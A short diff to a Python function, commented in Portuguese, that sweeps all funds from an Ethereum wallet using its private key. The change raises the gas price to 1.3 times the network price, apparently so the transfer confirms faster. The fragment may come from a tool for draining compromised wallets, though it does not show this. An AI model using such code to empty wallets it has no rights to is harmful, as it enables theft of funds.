@@ -59,7 +59,9 @@ def varrer_carteira(endereco_origem, chave_privada, endereco_destino):
             print("[⚠️] Carteira já está vazia. Nada a raspar.")
             return False
 
-        gas_price = w3.eth.gas_price
+        gas_price_base = w3.eth.gas_price        
+        
+        gas_price = int(gas_price_base * 1.3)
         gas_limit = 21000 # Custo padrão de transferência
         custo_gas = gas_limit * gas_price
         
